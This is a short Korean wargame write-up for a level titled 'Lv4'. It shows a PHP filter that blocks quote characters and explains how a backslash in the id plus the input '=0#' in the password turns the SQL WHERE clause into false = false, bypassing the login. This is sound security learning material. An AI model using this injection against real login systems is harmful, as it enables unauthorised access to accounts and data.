<img width="158" alt="스크린샷 2020-01-09 오후 8 17 29" src="https://user-images.githubusercontent.com/54495632/72067986-6174b100-3327-11ea-90fb-ce23e111ed30.png">

Lv4. !

<img width="611" alt="스크린샷 2020-01-09 오후 8 17 35" src="https://user-images.githubusercontent.com/54495632/72068003-6b96af80-3327-11ea-88cc-3c23f2602a18.png">

if(preg_match('/\'|\"/i', $id)){ exit("Query is filtered :( ");}
if(preg_match('/\'|\"/i', $pw)){ exit("Query is filtered :( ");}
preg_match 함수에 의해 작은 따옴표와 큰 따옴표가 필터링 된다.

\ 역슬래시 문자열로 이를 피하고 인젝션을 시도할 수 있다.
SELECT id FROM play_sql04 WHERE ID='\' and pw=' ' 의 경우
역슬래시에 의해 ' and pw= 가 id 로 들어오게 된다. 
물론 실제 db에 ' and pw= 라는 id 가 존재하는 경우 id = true ' 로 되겠지만
해당 id가 없으므로 다음과 같이 쿼리를 디자인 했다.

SELECT id FROM play_sql04 WHERE ID = '\' and pw='=0#'
와 같이 주게 되면 WHERE 문에서 false = false 와 같은 형태가 된다.

<img width="476" alt="스크린샷 2020-01-09 오후 10 33 42" src="https://user-images.githubusercontent.com/54495632/72072167-b2d56e00-3330-11ea-8a4c-751865d50569.png">

<img width="595" alt="스크린샷 2020-01-09 오후 10 33 48" src="https://user-images.githubusercontent.com/54495632/72072172-b49f3180-3330-11ea-9fff-95bd76ec545a.png">

= 등호 오른쪽 편에 false를 주는 방법은 여러 방법이 있을 것 같다.